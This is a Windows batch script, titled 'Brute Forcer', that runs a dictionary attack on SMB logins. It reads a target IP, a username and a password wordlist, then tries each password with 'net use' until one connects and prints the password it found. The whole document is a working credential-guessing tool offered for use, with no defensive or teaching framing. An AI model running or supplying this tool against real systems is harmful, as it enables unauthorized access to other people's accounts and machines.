@echo off
title Brute Forcer - by Simarpreet Singh
                                                                                                                                                            
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List as txt path: "

if not exist "%wordlist%" (
    echo The specified wordlist txt file does not exist.
    pause
    exit
)

for /f "usebackq delims=" %%a in ("%wordlist%") do (
    set "pass=%%a"
    call :attempt
)

echo Password not found.
pause
exit

:success
echo Password Found!: %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip% /user:%user% "%pass%" >nul 2>&1
if %errorlevel% equ 0 goto success

echo Attempt: %pass%
